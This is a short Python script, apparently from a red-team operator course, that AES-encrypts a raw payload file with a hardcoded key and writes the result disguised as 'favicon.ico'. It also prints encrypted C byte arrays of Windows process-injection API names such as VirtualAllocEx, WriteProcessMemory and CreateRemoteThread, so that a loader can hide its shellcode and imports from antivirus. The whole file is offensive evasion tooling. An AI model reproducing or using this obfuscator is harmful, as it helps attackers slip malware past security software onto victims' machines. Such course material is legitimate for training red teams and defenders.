# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = b'\x0c$\xf7\xe5\x87\x96fy\xbc\xcd\xa4\x81\r?\x07\x19'

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
#print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

f = open("favicon.ico","wb")
f.write(ciphertext)
f.close()

printCiphertext(aesenc("VirtualAllocEx",KEY))
printCiphertext(aesenc("VirtualProtect",KEY))
printCiphertext(aesenc("WriteProcessMemory",KEY))
printCiphertext(aesenc("CreateRemoteThread",KEY))
printCiphertext(aesenc("kernel32.dll",KEY))
printCiphertext(aesenc("VirtualAlloc",KEY))
